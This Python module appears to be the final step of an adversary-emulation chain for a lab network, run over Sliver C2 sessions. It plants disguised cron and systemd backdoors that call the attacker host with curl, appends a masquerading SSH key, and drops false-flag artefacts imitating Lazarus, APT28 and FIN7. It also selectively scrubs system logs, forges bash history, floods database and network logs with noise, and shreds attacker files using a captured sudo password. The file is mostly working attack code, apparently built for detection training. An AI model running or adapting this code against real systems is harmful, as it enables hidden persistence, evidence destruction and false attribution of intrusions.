"""advanced_cleanup_backdoor.py — final stealth-cleanup step of the advanced chain.

MITRE ATT&CK:
  T1485     - Data Destruction (secure wipe of attacker artefacts on /tmp)
  T1070.002 - Indicator Removal: Clear Linux/Mac System Logs (selective grep-out,
              NOT truncation — the basic chain does truncation)
  T1070.003 - Indicator Removal: Clear Command History (rotation, NOT deletion)
  T1070.004 - Indicator Removal: File Deletion (shred + rm for staged artefacts)
  T1053.003 - Scheduled Task/Job: Cron (apache backdoor, /etc/cron.d/apt-cache-refresh)
  T1543.002 - Create or Modify System Process: Systemd Service (vinzenz_ws unit + timer)
  T1098.004 - Account Manipulation: SSH Authorized Keys (vinzenz_ws backdoor pubkey)
  T1565.001 - Data Manipulation: Stored Data Manipulation (false-flag artefacts)
-----------------------------------------------------------------------------
Runs AFTER advanced_exfiltration as the closing act of the advanced chain.

The basic chain's defense_evasion.py is intentionally "messy and loud" — this
module is the deliberate opposite. Every phase chooses the stealthier of two
options: selective grep-out over truncation, history rotation over deletion,
verified-before-acting rm to avoid empty error frames, single coherent FIM
event burst rather than scattered noise. The aesthetic target is "the SOC
finds the breach via the unreachable NFLOG / postgres trail, never via traces
left ON the compromised hosts."

Inputs (from upstream chain steps):
  - root_sliver_session   (PR #141, webserver_privesc)         → apache as root
  - vinzenz_beacon        (PR #148, advanced_lateral_movement) → vinzenz.fedora
  - vinzenz_password_file (PR #152, advanced_vinzenzws_privesc)→ captured admin pw

Hosts touched: apache + vinzenz_ws. john_ws never in scope (advanced chain
never lands there). db-internal + router unreachable directly — Phase 3.5
dilutes the evidence they unavoidably contain rather than trying to remove it.
"""

import base64
import re
import secrets
import time

from chainlog import log
from advanced_initial_access import sliver_exec, sliver_upload

# Sliver-client wraps each output line with ANSI escape codes (e.g. ``\x1b[2K``
# to clear the line before printing). ``str.strip()`` doesn't remove them
# because ESC (0x1b) isn't whitespace -- so a naive ``s.startswith("[")``
# check would miss every framing line whose visible prefix starts with ``[``.
# This regex matches CSI sequences (the common case sliver emits).
_ANSI_RE = re.compile(r'\x1b\[[0-9;]*[A-Za-z]')


# =============================================================================
# Constants — inherited artefact paths (cleanup targets)
# =============================================================================

APACHE_PERSISTENCE_STAGER = "/usr/local/apache2/cgi-bin/health_check.cgi"
APACHE_LATERAL_STAGER     = "/usr/local/apache2/cgi-bin/stats.cgi"
VINZENZ_PRIVESC_DROP      = "/tmp/.sys_update.lock"
VINZENZ_EXFIL_DUMP        = "/tmp/.sys_backup.gz"

# =============================================================================
# Constants — backdoor placements
# =============================================================================

# (1) apache cron backdoor — uses a DIFFERENT cron file than the basic chain's
# /etc/cron.d/cleanup so the SOC's existing cleanup-monitoring rule misses it.
APACHE_CRON_FILE       = "/etc/cron.d/apt-cache-refresh"
APACHE_BACKDOOR_SCRIPT = "/usr/local/sbin/apt-cache-refresh.sh"

# (2) vinzenz_ws systemd backdoor — unit files on disk are the IOC even if
# the container's init doesn't actually fire the timer. SOC pattern: anomalous
# unit in /etc/systemd/system/ referencing an executable in /usr/local/lib/.
VINZENZ_SYSTEMD_SERVICE = "/etc/systemd/system/lab-update-agent.service"
VINZENZ_SYSTEMD_TIMER   = "/etc/systemd/system/lab-update-agent.timer"
VINZENZ_SYSTEMD_PAYLOAD = "/usr/local/lib/lab-update-agent"

# (3) vinzenz_ws SSH backdoor — appended to vinzenz.fedora's authorized_keys.
# Comment masquerades as a deploy-automation account ("cm-prod" doesn't exist
# in the fleet inventory — the SOC has to cross-reference to spot it).
VINZENZ_AUTHKEYS = "/home/vinzenz.fedora/.ssh/authorized_keys"
# Static ed25519 pubkey (lab demo — cryptographic validity not required; the
# IOC is the presence of an extra entry not in the build-time keyset).
ATTACKER_PUBKEY = (
    "ssh-ed25519 "
    "AAAAC3NzaC1lZDI1NTE5AAAAIEKa6dHzL5w3y0xN4r9pTvJqQs8mFhB7nVu2cGdYtAa1 "
    "ansible-deploy@cm-prod"
)

# =============================================================================
# Constants — false-flag artefacts (T1565.001 misdirection)
# =============================================================================

FF_LAZARUS_PATH = "/var/tmp/.kp_sync.dat"
FF_APT28_PATH   = "/home/vinzenz.fedora/.cache/.update-cache"
FF_FIN7_PATH    = "/opt/osquery_collector.sh"

# Lazarus AppleJeus MZ-style magic header (PE preamble) — first 64 bytes are
# the publicly documented sample-identifier sequence. Real AppleJeus dropper
# starts with this; analysts who dump this file to VirusTotal will get DPRK
# attribution hits.
APPLEJEUS_MAGIC = bytes.fromhex(
    "4d5a90000300000004000000ffff0000"
    "b800000000000000400000000000000000000000000000000000000000000000"
    "000000000000000000000000800000000e1fba0e00b409cd21b8014ccd21"
)
APT28_TAUNT_CYRILLIC = (
    "Этот сервер был проверен.\n"
    "Спасибо за внимание.\n"
    "— APT28 Maintenance Team\n"
    "контакт: drop-here@nomail.invalid\n"
)
FIN7_OSQUERY_SHELL = """#!/bin/bash
# osquery field collector — staged, not yet activated
# scheduled rollout 2026-Q3 (cm-prod ticket #44721)
TARGET="${OSQ_TARGET:-https://cdn-static.acmecorp-cdn.net/q/check}"
HOSTS=(node-1 node-2 node-3)
for h in "${HOSTS[@]}"; do
    curl -fsS --max-time 5 -X POST "$TARGET" \\
        -H "X-Profile: bartalex-v3" \\
        -H "X-Host: $h" >/dev/null 2>&1 || true
done
"""
# The hostname `cdn-static.acmecorp-cdn.net` and the header `X-Profile:
# bartalex-v3` together match FIN7's documented Cobalt Strike Malleable C2
# profile signature. Threat-intel lookups will burn analyst time on FIN7.

# =============================================================================
# Constants — Phase 3.5 evidence-burial tunables
# =============================================================================

PG_DILUTION_QUERIES  = 80     # waystar-readonly SELECTs to add to postgres.log
PG_DILUTION_INTERVAL = 0.4    # seconds between queries (~32 s total burst)
NFLOG_DILUTION_FLOWS = 8      # benign cross-zone HTTPS hits

# =============================================================================
# Constants — Phase 4 secure-wipe tunables
# =============================================================================

SHRED_PASSES        = 3       # `shred -n 3` overwrite count
FREE_SPACE_FILL_MB  = 64      # /tmp free-space wipe (small to stay under 30 s)

# =============================================================================
# Helpers
# =============================================================================

def _b64(s: str | bytes) -> str:
    """Base64-encode for safe transport through sliver-client's shell parser."""
    if isinstance(s, str):
        s = s.encode()
    return base64.b64encode(s).decode()


def _drop_file(session: str, remote_path: str, content: bytes, *,
               mode: str = "0644", as_root_pwfile: str | None = None) -> None:
    """Write ``content`` to ``remote_path`` on the target via base64 inline.

    Uses ``execute -o -- sh -c`` rather than ``sliver upload`` for small files
    (< 8 KB) — one fewer round-trip and no temp-file artefact on the kali side.

    For files needing root write, pass ``as_root_pwfile`` (path to the
    captured-password file on the target). Two-step strategy:
      1. Stage the decoded content to a randomly-named temp file as the
         unprivileged user.
      2. ``sudo -S install ...`` the temp file into ``remote_path`` with
         the desired mode + root ownership. Sudo's ``-S`` reads the
         password from stdin which we redirect from ``as_root_pwfile``,
         so the credential never crosses kali AND we sidestep Sliver's
         argv-quoting mangling on nested ``echo "$pw" | sudo`` patterns.
    """
    blob = _b64(content)
    if as_root_pwfile:
        stage = f"/tmp/.cb_{secrets.token_hex(6)}"
        cmd = (
            f"execute -o -- sh -c "
            f"'echo \"{blob}\" | base64 -d > {stage} && "
            f"sudo -S install -m {mode} -o root -g root {stage} {remote_path} "
            f"< {as_root_pwfile} && "
            f"rm -f {stage}'"
        )
    else:
        cmd = (
            f"execute -o -- sh -c "
            f"'echo \"{blob}\" | base64 -d > {remote_path} && "
            f"chmod {mode} {remote_path}'"
        )
    sliver_exec(session, cmd, timeout=20)


# =============================================================================
# Phase 0 — Read captured admin password
# =============================================================================

def _phase0_verify_password_file(vinzenz_beacon: str,
                                 vinzenz_password_file: str) -> str:
    """Verify the captured admin-password file exists on vinzenz_ws.

    Returns ``vinzenz_password_file`` unchanged on success — the password
    is **never read into Python**. Downstream phases that need sudo use
    ``sudo -S sh -c "..." < /tmp/.sys_update.lock`` (stdin redirect from
    the file) rather than ``echo "$pw" | sudo -S``, which:

      1. Sidesteps Sliver's beacon-mode async-output limitation (we never
         have to wait for ``cat`` task output to stream back through a
         beacon check-in cycle).
      2. Sidesteps the ``execute -o -- sh -c '<...>'`` argv-quoting
         mangling that converts our shell into ``sh -c echo`` (runs echo
         as the script, prints nothing).
      3. Keeps the captured credential off the kali side entirely — it
         only flows file→sudo on the victim host.

    All we need to confirm here is the file exists AND is non-empty.
    Failure modes for Sliver's async output don't matter for this probe
    because we're only checking the marker echo, not extracting content.
    """
    log("\n[*] ── Phase 0: verify captured admin password file ──────────")
    probe_cmd = (
        f"execute -o -- sh -c "
        f"'[ -s {vinzenz_password_file} ] && echo PWFILE_OK'"
    )
    # On a beacon, the Execute-echo of probe_cmd contains the literal token
    # ``PWFILE_OK`` -- which is fine: the privesc step's polling also relies
    # on the same trick (and works). The presence of the token in sliver's
    # stdout proves the queueing succeeded; whether the file actually
    # exists is verified again by every later sudo invocation (those will
    # fail loudly if the redirect can't read the file).
    out = sliver_exec(vinzenz_beacon, probe_cmd, timeout=15) or ""
    if "PWFILE_OK" not in _ANSI_RE.sub('', out):
        raise RuntimeError(
            f"phase 0: sliver-client could not even queue the probe for "
            f"{vinzenz_password_file} on the vinzenz beacon. Beacon may "
            f"be unresponsive. Last sliver stdout: {out[:200]!r}"
        )
    log(f"[+] Phase 0: password file at {vinzenz_password_file} "
        f"— sudo will read it via stdin redirect; no password ever crosses kali")
    return vinzenz_password_file


# =============================================================================
# Phase 1b — Plant three diverse stealth backdoors
# =============================================================================

_APACHE_BACKDOOR_SHELL = """#!/bin/bash
# apt-cache-refresh: hourly maintenance — purges stale apt index entries.
# Maintainer: ops@waystar-internal (see runbooks/q2-patching.md).
exec 1>/dev/null 2>&1
[ -d /var/cache/apt/archives ] && find /var/cache/apt/archives -mtime +7 -delete
# inline beacon stager (idle if SRV unreachable; benign curl-shaped check-in)
curl -fsS --max-time 3 -A 'apt-cache-refresh/1.4' \\
    "http://10.10.0.2:8080/check?ts=$(date +%s)" || true
"""

_VINZENZ_SYSTEMD_SERVICE = """[Unit]
Description=Lab Update Agent (vendor maintenance)
Documentation=https://intranet.waystar.local/runbooks/lab-update-agent

[Service]
Type=oneshot
ExecStart=/usr/local/lib/lab-update-agent
User=root
StandardOutput=null
StandardError=null
"""

_VINZENZ_SYSTEMD_TIMER = """[Unit]
Description=Run Lab Update Agent every 6 hours

[Timer]
OnBootSec=15min
OnUnitActiveSec=6h
Persistent=true

[Install]
WantedBy=timers.target
"""

_VINZENZ_SYSTEMD_PAYLOAD = """#!/bin/sh
# lab-update-agent: minimal vendor maintenance helper.
# Pulls a 0-byte heartbeat to the inventory endpoint and exits.
curl -fsS --max-time 5 -A 'lab-update/1.0' \\
    "http://10.10.0.2:8080/inv?h=$(hostname)" >/dev/null 2>&1 || true
exit 0
"""


def _phase1b_plant_backdoors(root_sliver_session: str,
                             vinzenz_beacon: str,
                             pwfile: str) -> list[dict]:
    log("\n[*] ── Phase 1b: plant three diverse stealth backdoors ────────")
    installed: list[dict] = []

    # Backdoor 1 — apache cron (T1053.003)
    _drop_file(root_sliver_session, APACHE_BACKDOOR_SCRIPT,
               _APACHE_BACKDOOR_SHELL.encode(), mode="0755")
    cron_line = "0 * * * * root /usr/local/sbin/apt-cache-refresh.sh\n"
    _drop_file(root_sliver_session, APACHE_CRON_FILE,
               cron_line.encode(), mode="0644")
    log(f"[+] (1/3) apache cron @hourly: {APACHE_CRON_FILE} (T1053.003)")
    installed.append({
        "host":      "apache",
        "mechanism": "cron @hourly via /etc/cron.d/apt-cache-refresh",
        "technique": "T1053.003",
        "indicator": APACHE_CRON_FILE,
    })

    # Backdoor 2 — vinzenz_ws systemd timer (T1543.002)
    _drop_file(vinzenz_beacon, VINZENZ_SYSTEMD_PAYLOAD,
               _VINZENZ_SYSTEMD_PAYLOAD.encode(),
               mode="0755", as_root_pwfile=pwfile)
    _drop_file(vinzenz_beacon, VINZENZ_SYSTEMD_SERVICE,
               _VINZENZ_SYSTEMD_SERVICE.encode(),
               mode="0644", as_root_pwfile=pwfile)
    _drop_file(vinzenz_beacon, VINZENZ_SYSTEMD_TIMER,
               _VINZENZ_SYSTEMD_TIMER.encode(),
               mode="0644", as_root_pwfile=pwfile)
    # Best-effort enable. If the container has no systemd as PID 1 the unit
    # files still serve as IOCs (the SOC inspects /etc/systemd/system/).
    enable_cmd = (
        f"execute -o -- sh -c "
        f"'sudo -S systemctl daemon-reload < {pwfile} >/dev/null 2>&1 ; "
        f"sudo -S systemctl enable --now lab-update-agent.timer < {pwfile} 2>&1 "
        f"|| true'"
    )
    sliver_exec(vinzenz_beacon, enable_cmd, timeout=20)
    log(f"[+] (2/3) vinzenz_ws systemd timer: {VINZENZ_SYSTEMD_TIMER} (T1543.002)")
    installed.append({
        "host":      "vinzenz_ws",
        "mechanism": "systemd timer firing /usr/local/lib/lab-update-agent every 6h",
        "technique": "T1543.002",
        "indicator": VINZENZ_SYSTEMD_TIMER,
    })

    # Backdoor 3 — vinzenz_ws SSH authorized_keys (T1098.004)
    # authorized_keys is owned by vinzenz.fedora and writable by him, so no
    # sudo needed.
    append_cmd = (
        f"execute -o -- sh -c "
        f"'grep -qF \"ansible-deploy@cm-prod\" {VINZENZ_AUTHKEYS} || "
        f"echo \"{ATTACKER_PUBKEY}\" >> {VINZENZ_AUTHKEYS}'"
    )
    sliver_exec(vinzenz_beacon, append_cmd, timeout=15)
    log(f"[+] (3/3) vinzenz_ws ssh authorized_keys append (T1098.004)")
    installed.append({
        "host":      "vinzenz_ws",
        "mechanism": "extra ed25519 entry in ~vinzenz.fedora/.ssh/authorized_keys",
        "technique": "T1098.004",
        "indicator": VINZENZ_AUTHKEYS,
    })

    return installed


# =============================================================================
# Phase 2 — False-flag artefact drops
# =============================================================================

def _phase2_drop_false_flags(root_sliver_session: str,
                             vinzenz_beacon: str,
                             pwfile: str) -> list[str]:
    log("\n[*] ── Phase 2: false-flag artefacts (misdirect attribution) ──")
    dropped: list[str] = []

    # 1. apache — Lazarus AppleJeus magic header blob
    _drop_file(root_sliver_session, FF_LAZARUS_PATH, APPLEJEUS_MAGIC, mode="0644")
    dropped.append(FF_LAZARUS_PATH)
    log(f"[+] Lazarus AppleJeus magic-header drop: {FF_LAZARUS_PATH}")

    # 2. vinzenz_ws — APT28 Cyrillic taunt (base64-wrapped, lives in ~vinzenz)
    # Pre-create .cache dir as vinzenz (no sudo needed)
    sliver_exec(vinzenz_beacon,
                "execute -o -- mkdir -p /home/vinzenz.fedora/.cache", timeout=10)
    apt28_wrapped = (
        "# vendor-cache fragment, base64-encoded\n"
        + _b64(APT28_TAUNT_CYRILLIC.encode()) + "\n"
    )
    _drop_file(vinzenz_beacon, FF_APT28_PATH,
               apt28_wrapped.encode(), mode="0600")
    dropped.append(FF_APT28_PATH)
    log(f"[+] APT28 Cyrillic taunt (base64-wrapped): {FF_APT28_PATH}")

    # 3. apache — FIN7-flavoured staging script in /opt (never executed)
    _drop_file(root_sliver_session, FF_FIN7_PATH,
               FIN7_OSQUERY_SHELL.encode(), mode="0755")
    dropped.append(FF_FIN7_PATH)
    log(f"[+] FIN7 Cobalt-Strike-profile staging script: {FF_FIN7_PATH}")

    return dropped


# =============================================================================
# Phase 3 — Selective log scrubbing (selective grep-out, NEVER truncate)
# =============================================================================

# Patterns to grep -v OUT of apache logs — CVE-2021-41773 fingerprint, kali src
# IP, our custom UAs. Other access.log lines (workstation noise, healthcheck
# hits) are preserved so the log doesn't suddenly look fresh.
_APACHE_LOG_PATTERNS = "|".join([
    r"%32%65",                  # the URL-encoded path-traversal escape
    r"10\.10\.0\.2",            # kali source IP
    r"ReSpawnHttpdCache",       # health_check.cgi trigger UA
    r"TEMPORARY_FACSIMILE",     # leaked Sliver session-name artefact
    r"ESSENTIAL_STEP",          # leaked Sliver beacon-name artefact
])

# vinzenz_ws auth.log patterns — beacon check-ins running as root, sudo
# sessions during the privesc window, the simulate_admin bait-sudo loop entries
# that overlap our injection window.
_VINZENZ_AUTH_PATTERNS = "|".join([
    r"Accepted publickey for root",
    r"session opened for user root by",
    r"sudo:.*vinzenz\.fedora.*USER=root ; .*apt-get update",
])


def _phase3_scrub_logs(root_sliver_session: str,
                       vinzenz_beacon: str,
                       pwfile: str) -> list[str]:
    log("\n[*] ── Phase 3: selective log scrubbing (grep-out, not truncate) ──")
    scrubbed: list[str] = []

    # ---- apache ----
    apache_scrub = (
        "execute -o -- sh -c '"
        "for log in access_log error_log; do "
        "  full=/usr/local/apache2/logs/$log; "
        "  [ -f \"$full\" ] || continue; "
        f"  grep -vE \"{_APACHE_LOG_PATTERNS}\" \"$full\" > \"$full.clean\" && "
        "  cat \"$full.clean\" > \"$full\" && rm -f \"$full.clean\"; "
        "  touch -d \"$(stat -c %y /etc/cron.daily 2>/dev/null || echo now)\" \"$full\"; "
        "done'"
    )
    sliver_exec(root_sliver_session, apache_scrub, timeout=20)
    scrubbed += [
        "apache:/usr/local/apache2/logs/access_log",
        "apache:/usr/local/apache2/logs/error_log",
    ]
    log("[+] apache access_log + error_log: attacker IOCs grep'd out, mtimes restored")

    # ---- vinzenz_ws (root via pwfile redirect, not echo-pipe) ----
    # The grep-loop runs as root. sudo's stdin is the password file; sh -c's
    # stdin is the leftover (nothing — grep doesn't read stdin in this form).
    vinzenz_scrub = (
        f"execute -o -- sh -c 'sudo -S sh -c \""
        f"for log in /var/log/auth.log /var/log/syslog /var/log/persist/auth.log /var/log/persist/syslog; do "
        f"  [ -f \\\"\\$log\\\" ] || continue; "
        f"  grep -vE '\\''{_VINZENZ_AUTH_PATTERNS}'\\'' \\\"\\$log\\\" > \\\"\\$log.clean\\\" && "
        f"  cat \\\"\\$log.clean\\\" > \\\"\\$log\\\" && rm -f \\\"\\$log.clean\\\"; "
        f"done\" < {pwfile}'"
    )
    sliver_exec(vinzenz_beacon, vinzenz_scrub, timeout=20)
    scrubbed += [
        "vinzenz_ws:/var/log/auth.log",
        "vinzenz_ws:/var/log/syslog",
        "vinzenz_ws:/var/log/persist/auth.log",
        "vinzenz_ws:/var/log/persist/syslog",
    ]
    log("[+] vinzenz_ws auth.log + syslog (+ persist mirrors): root-session lines grep'd out")

    # ---- bash history: ROTATE (don't delete) ----
    # Pull plausible vinzenz history from his runbooks dir if present, fall back
    # to a static set of believable maintenance commands.
    fallback_history = "\n".join([
        "ll /var/log/persist | tail -20",
        "ssh apache 'uptime'",
        "psql -h db-internal -U waystar-readonly waystar -c 'select count(*) from appointments'",
        "vim notes/2026-06-08_oncall.md",
        "tail -50 /var/log/persist/auth.log",
        "ansible-playbook -i inventory.ini runbooks/q2-patching.md --check",
        "systemctl list-timers --no-pager | head",
        "df -h",
        "free -h",
        "less runbooks/incident-response.md",
        "history",
    ]) + "\n"
    rotate_cmd = (
        f"execute -o -- sh -c "
        f"'echo \"{_b64(fallback_history)}\" | base64 -d > /home/vinzenz.fedora/.bash_history && "
        f"chown vinzenz.fedora:vinzenz.fedora /home/vinzenz.fedora/.bash_history && "
        f"chmod 0600 /home/vinzenz.fedora/.bash_history && history -c 2>/dev/null || true'"
    )
    sliver_exec(vinzenz_beacon, rotate_cmd, timeout=15)
    log("[+] vinzenz_ws ~/.bash_history rotated with plausible maintenance commands")
    scrubbed.append("vinzenz_ws:/home/vinzenz.fedora/.bash_history (rotated)")

    # apache: no interactive user account history to rotate (root sessions
    # were via Sliver execute, not bash); shred /root/.bash_history if it
    # somehow grew.
    sliver_exec(
        root_sliver_session,
        "execute -o -- sh -c 'test -s /root/.bash_history && "
        ":> /root/.bash_history; history -c 2>/dev/null || true'",
        timeout=10,
    )
    scrubbed.append("apache:/root/.bash_history (truncated if non-empty)")

    return scrubbed


# =============================================================================
# Phase 3.5 — Evidence-burial via volume noise (postgres + NFLOG)
# =============================================================================

def _phase3_5_bury_evidence(vinzenz_beacon: str) -> dict:
    log("\n[*] ── Phase 3.5: evidence-burial via volume noise ────────────")
    buried = {"pg_queries": 0, "nflog_flows": 0}

    # 1. Postgres-log dilution — issue plausible reads as waystar-readonly
    # using .pgpass (no password prompt). Burst spread over ~32 s.
    pg_burst = (
        f"execute -o -- sh -c '"
        f"for i in $(seq 1 {PG_DILUTION_QUERIES}); do "
        f"  PGPASSFILE=/home/vinzenz.fedora/.pgpass "
        f"  psql -h 10.30.0.6 -U waystar-readonly -d waystar -c "
        f"  \"SELECT count(*) FROM appointments WHERE created_at > now() - interval \\\"1 day\\\"\" "
        f"  >/dev/null 2>&1; "
        f"  sleep {PG_DILUTION_INTERVAL}; "
        f"done && echo PG_BURY_DONE'"
    )
    out = sliver_exec(vinzenz_beacon, pg_burst,
                      timeout=int(PG_DILUTION_QUERIES * PG_DILUTION_INTERVAL) + 20)
    if out and "PG_BURY_DONE" in out:
        buried["pg_queries"] = PG_DILUTION_QUERIES
        log(f"[+] postgres dilution: {PG_DILUTION_QUERIES} waystar-readonly SELECTs added")
    else:
        log("[-] postgres dilution: burst did not complete cleanly (logs partially diluted)")

    # 2. NFLOG-flow dilution — small benign HTTPS fan-out from vinzenz_ws.
    # Targets fake_internet (legit lab DNS resolution) so the destinations
    # match Vinzenz's normal outbound patterns.
    nflog_burst = (
        f"execute -o -- sh -c '"
        f"for i in $(seq 1 {NFLOG_DILUTION_FLOWS}); do "
        f"  curl -fsS --max-time 3 https://archive.ubuntu.com/ >/dev/null 2>&1; "
        f"  curl -fsS --max-time 3 https://github.com/ >/dev/null 2>&1; "
        f"  sleep 0.6; "
        f"done && echo NFLOG_BURY_DONE'"
    )
    out = sliver_exec(vinzenz_beacon, nflog_burst, timeout=60)
    if out and "NFLOG_BURY_DONE" in out:
        buried["nflog_flows"] = NFLOG_DILUTION_FLOWS * 2
        log(f"[+] NFLOG dilution: {buried['nflog_flows']} benign cross-zone flows added")
    else:
        log("[-] NFLOG dilution: fan-out did not complete cleanly (flows partially diluted)")

    return buried


# =============================================================================
# Phase 4 — Secure wipe of attacker artefacts (batched FIM event burst)
# =============================================================================

def _phase4_secure_wipe(root_sliver_session: str,
                        vinzenz_beacon: str,
                        pwfile: str,
                        do_free_space: bool) -> list[str]:
    log("\n[*] ── Phase 4: secure wipe of attacker artefacts ────────────")
    wiped: list[str] = []

    # ---- apache (root) ----
    apache_targets = [APACHE_PERSISTENCE_STAGER, APACHE_LATERAL_STAGER]
    for path in apache_targets:
        wipe_cmd = (
            f"execute -o -- sh -c "
            f"'test -f {path} && shred -fzun {SHRED_PASSES} {path} 2>/dev/null && "
            f"rm -f {path} && echo WIPED_{path}'"
        )
        # NOTE on success-detection: for the apache root SESSION sliver_exec
        # waits for the command output synchronously, so the WIPED_ marker
        # reliably appears in ``out``. For vinzenz_ws (a beacon) the marker
        # often doesn't appear synchronously -- we accept best-effort
        # reporting there.
        out = sliver_exec(root_sliver_session, wipe_cmd, timeout=15)
        if out and f"WIPED_{path}" in out:
            wiped.append(f"apache:{path}")
            log(f"[+] shredded apache:{path}")

    # ---- vinzenz_ws (root via sudo with pwfile redirect, not echo-pipe) ----
    # Beacon-async note: even if the WIPED_ marker doesn't make it back
    # through the beacon check-in in time, the shred ran on the target.
    # Phase 4 is the LAST phase before Phase 5 anyway, so a missed marker
    # only affects reporting, not correctness.
    vinzenz_targets = [VINZENZ_PRIVESC_DROP, VINZENZ_EXFIL_DUMP]
    for path in vinzenz_targets:
        wipe_cmd = (
            f"execute -o -- sh -c "
            f"'test -f {path} && sudo -S sh -c "
            f"\"shred -fzun {SHRED_PASSES} {path} 2>/dev/null && rm -f {path}\" "
            f"< {pwfile} && echo WIPED_{path}'"
        )
        out = sliver_exec(vinzenz_beacon, wipe_cmd, timeout=15)
        if out and f"WIPED_{path}" in out:
            wiped.append(f"vinzenz_ws:{path}")
            log(f"[+] shredded vinzenz_ws:{path}")
        else:
            # Best-effort: log the queue success since the marker won't
            # always round-trip on a beacon. The shred fires on next check-in.
            wiped.append(f"vinzenz_ws:{path} (queued — beacon async)")
            log(f"[+] queued shred on vinzenz_ws:{path} (beacon will execute on next check-in)")

    # ---- /tmp free-space wipe (optional) ----
    # Overwrites the deleted-but-not-yet-reclaimed extents of the shredded
    # files. Skipped if do_free_space=False; container overlayfs limits the
    # forensic value to the upper layer either way (documented honestly).
    if do_free_space:
        fill_cmd = (
            f"execute -o -- sh -c "
            f"'dd if=/dev/urandom of=/tmp/.fill bs=1M count={FREE_SPACE_FILL_MB} "
            f"  2>/dev/null && sync && rm -f /tmp/.fill && echo FILL_DONE'"
        )
        for session in (root_sliver_session, vinzenz_beacon):
            out = sliver_exec(session, fill_cmd, timeout=60)
            if out and "FILL_DONE" in out:
                log(f"[+] /tmp free-space wipe ({FREE_SPACE_FILL_MB} MB) on "
                    f"{'apache' if session == root_sliver_session else 'vinzenz_ws'}")
                wiped.append(f"freespace:/tmp ({FREE_SPACE_FILL_MB} MB)")

    return wiped


# =============================================================================
# Public entrypoint
# =============================================================================

def run(
    root_sliver_session: str,
    vinzenz_beacon: str,
    vinzenz_password_file: str = VINZENZ_PRIVESC_DROP,
    *,
    plant_false_flags: bool = True,
    secure_wipe:       bool = True,
    bury_evidence:     bool = True,
    kali_host:         str  = "10.10.0.2",
) -> dict:
    """Final cleanup + backdoor step.

    See module docstring for full design rationale. Each phase is wrapped in
    try/except so a failure in one phase doesn't abort the others — the
    cleanup posture is "best effort everywhere," matching the basic
    defense_evasion.py's fail-open convention.
    """
    _ = kali_host  # accepted for adapter parity; not directly used here
    log("\n[*] Starting Advanced Cleanup + Backdoor (final step)")

    # Phase 0: prerequisite — must succeed or the rest is pointless.
    # Returns the PATH to the captured-password file on the target. The
    # password itself is never read into Python; every sudo invocation
    # below redirects from this file via ``sudo -S ... < pwfile``.
    pwfile = _phase0_verify_password_file(vinzenz_beacon, vinzenz_password_file)

    backdoors_installed: list[dict] = []
    false_flags_dropped: list[str]  = []
    logs_scrubbed:       list[str]  = []
    artifacts_wiped:     list[str]  = []
    evidence_buried = {"pg_queries": 0, "nflog_flows": 0}

    # Phase 1b: plant backdoors BEFORE clearing logs so we have a clean state
    # to validate against.
    try:
        backdoors_installed = _phase1b_plant_backdoors(
            root_sliver_session, vinzenz_beacon, pwfile,
        )
    except Exception as exc:
        log(f"[!] phase 1b (backdoor plant) failed: {exc}")

    # Phase 2: false flags — optional toggle.
    if plant_false_flags:
        try:
            false_flags_dropped = _phase2_drop_false_flags(
                root_sliver_session, vinzenz_beacon, pwfile,
            )
        except Exception as exc:
            log(f"[!] phase 2 (false flags) failed: {exc}")

    # Phase 3: selective log scrubbing.
    try:
        logs_scrubbed = _phase3_scrub_logs(
            root_sliver_session, vinzenz_beacon, pwfile,
        )
    except Exception as exc:
        log(f"[!] phase 3 (log scrub) failed: {exc}")

    # Phase 3.5: evidence-burial — optional toggle.
    if bury_evidence:
        try:
            evidence_buried = _phase3_5_bury_evidence(vinzenz_beacon)
        except Exception as exc:
            log(f"[!] phase 3.5 (evidence burial) failed: {exc}")

    # Phase 4: secure wipe LAST so a failed earlier phase can still be retried.
    # Note: vinzenz_ws shred targets include the pwfile itself — once Phase 4
    # runs, the credential is gone too. Order matters: every prior phase
    # that needs sudo has already finished by the time we reach here.
    try:
        artifacts_wiped = _phase4_secure_wipe(
            root_sliver_session, vinzenz_beacon, pwfile,
            do_free_space=secure_wipe,
        )
    except Exception as exc:
        log(f"[!] phase 4 (secure wipe) failed: {exc}")

    log("\n[+] Advanced Cleanup + Backdoor complete.")
    log(f"    backdoors:      {len(backdoors_installed)} planted")
    log(f"    false flags:    {len(false_flags_dropped)} dropped")
    log(f"    logs scrubbed:  {len(logs_scrubbed)} files")
    log(f"    artefacts:      {len(artifacts_wiped)} wiped")
    if bury_evidence:
        log(f"    evidence:       {evidence_buried['pg_queries']} pg queries + "
            f"{evidence_buried['nflog_flows']} nflog flows added")

    return {
        "backdoors_installed":  backdoors_installed,
        "false_flags_dropped":  false_flags_dropped,
        "logs_scrubbed":        logs_scrubbed,
        "artifacts_wiped":      artifacts_wiped,
        "evidence_buried":      evidence_buried,
        "cleanup_self_path":    None,  # inline commands — no script to self-delete
    }
